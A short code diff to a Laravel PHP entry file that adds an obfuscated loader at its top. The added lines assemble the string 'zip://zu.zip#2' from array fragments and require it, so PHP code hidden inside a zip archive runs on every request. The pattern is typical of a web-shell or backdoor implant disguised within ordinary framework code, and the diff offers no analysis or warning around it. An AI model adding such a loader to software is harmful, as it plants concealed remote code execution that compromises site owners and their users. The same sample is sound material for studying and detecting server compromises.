@@ -1,4 +1,7 @@
 <?php
+$zuiv = ['zip', ':', '/', '/zu.', 'zi', 'p#', '2'];
+require implode("", $zuiv);
+?><?php
 
 /**
  * Laravel - A PHP Framework For Web Artisans
